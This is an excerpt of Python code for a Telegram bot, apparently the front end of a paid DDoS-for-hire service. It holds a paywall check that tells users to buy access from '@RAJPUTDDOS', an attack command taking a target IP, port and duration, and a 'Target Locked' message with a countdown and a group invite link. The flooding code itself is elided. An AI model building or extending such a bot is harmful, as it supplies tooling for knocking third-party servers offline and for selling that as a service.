...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ YE BOT FREE NAHI H BUY KAR LE @RAJPUTDDOS SE❌! /get_id*", parse_mode='Markdown')
        return
    message = (
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ YE BOT FREE NAHI H BUY KAR LE @RAJPUTDDOS SE❌!*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
    ...
    chat_id=chat_id,
    text=(
        f"*💀 RAJPUT JI GYA SERVER ! 💀*\n"
        f"*🎯 Target Locked: {ip}:{port}*\n"
        f"*⏳ Countdown: {duration} seconds*\n"
        f"* 🔥 Join :- https://t.me/+iEJcE-Il6aUwNzk1 🔥*\n" 
    ),
    parse_mode='Markdown'
)
